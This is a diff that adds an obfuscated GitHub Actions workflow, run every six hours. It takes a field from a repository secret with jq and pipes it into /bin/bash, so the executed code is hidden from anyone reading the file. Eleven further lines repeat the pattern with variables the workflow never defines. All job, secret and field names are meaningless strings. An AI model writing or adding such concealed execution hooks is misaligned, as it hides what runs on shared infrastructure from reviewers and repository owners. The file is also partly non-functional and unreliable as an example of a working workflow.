@@ -1,0 +1,28 @@
+name: wuxuegongcao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuxuegongcao
+        env:
+          rbi39: ${{ secrets.rbi39 }}
+        run: |
+          echo $rbi39 | jq -r .eh08534 | /bin/bash
+          echo $dnz0 | jq -r .x21 | /bin/bash
+          echo $ogig1271 | jq -r .nh2942 | /bin/bash
+          echo $g359 | jq -r .gmy367 | /bin/bash
+          echo $ocege24539 | jq -r .o34 | /bin/bash
+          echo $lvcqx48765 | jq -r .wabs1087 | /bin/bash
+          echo $wdco79667 | jq -r .slsc7 | /bin/bash
+          echo $b73 | jq -r .x694 | /bin/bash
+          echo $ffjg36 | jq -r .xdbi326 | /bin/bash
+          echo $km0 | jq -r .sk687 | /bin/bash
+          echo $eocgt7 | jq -r .t8 | /bin/bash
+          echo $cditx12 | jq -r .xe87514 | /bin/bash
+
